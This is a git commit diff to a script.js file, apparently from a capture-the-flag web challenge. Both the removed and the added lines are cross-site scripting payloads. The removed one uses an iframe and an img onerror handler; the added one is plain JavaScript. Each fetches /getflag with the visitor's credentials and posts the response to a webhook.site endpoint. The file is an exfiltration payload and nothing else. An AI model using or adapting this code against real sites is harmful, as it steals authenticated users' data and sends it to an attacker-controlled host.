223974fa9eb6b21dea35c47343a38c97c38c87aa
iris-chieh <146847095+iris-chieh@users.noreply.github.com>
2025-04-19 09:32:22 +0800

    Update script.js

--- script.js
+++ script.js
@@ -1,11 +1,9 @@
-<iframe srcdoc='
-  <img src=x onerror="
-    fetch(`/getflag`, { credentials: `include` })
-      .then(r=>r.text())
-      .then(f=>{
-        fetch(`https://webhook.site/9e9b0fae-1211-4d2f-b5f9-5cf25e9fa220`, {
-          method: `POST`, mode: `no-cors`, body: f
-        })
-      })
-  ">
-'></iframe>
+fetch("/getflag", { credentials: "include" })
+  .then(r => r.text())
+  .then(flag => {
+    fetch("https://webhook.site/你的ID", {
+      method: "POST",
+      mode: "no-cors",
+      body: flag
+    });
+  });
